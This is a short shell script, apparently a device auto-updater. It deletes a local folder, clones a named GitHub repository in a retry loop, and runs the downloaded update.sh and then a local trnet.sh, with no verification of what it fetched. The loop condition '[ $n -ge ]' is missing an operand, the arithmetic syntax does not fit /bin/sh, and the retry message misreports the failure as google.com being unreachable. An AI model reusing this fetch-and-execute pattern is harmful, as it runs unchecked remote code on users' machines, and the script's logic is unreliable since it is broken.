#!/bin/sh

sleep 5s
rm -rf update
sleep 3s

n=0
   until [ $n -ge ]
   do
      git clone "https://github.com/ubol12341/update.git" && break
      n=$[$n+1]
sleep 3s
echo "www.google.com is unreachable. Retrying"
sleep 12s
      sleep 1
   done

sleep 3s
cd update
chmod +x update.sh
echo "online"
sleep 120s
./update.sh
cd
./trnet.sh
